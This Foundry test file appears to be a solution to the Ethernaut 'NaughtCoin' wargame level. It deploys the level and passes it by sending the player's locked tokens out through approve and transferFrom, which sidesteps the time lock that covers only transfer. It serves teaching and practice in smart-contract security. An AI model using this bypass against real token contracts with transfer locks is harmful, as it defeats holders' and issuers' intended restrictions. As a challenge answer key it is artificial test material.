// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/15-NaughtCoin/NaughtCoinFactory.sol";
import "../src/Ethernaut.sol";

contract NaughtCoinTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);
    address secondAddress = address(9256);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 1 ether);
    }

    function testNaughtCoin() public {
        // Level Setup
        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(payable(levelAddress));

        // Level Attack
        uint256 balance = ethernautNaughtCoin.balanceOf(playerAddress);
        ethernautNaughtCoin.approve(secondAddress, balance);
        vm.stopPrank();
        vm.startPrank(secondAddress);
        ethernautNaughtCoin.transferFrom(playerAddress, secondAddress, balance);
        vm.stopPrank();

        // Level Submission
        vm.startPrank(playerAddress);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}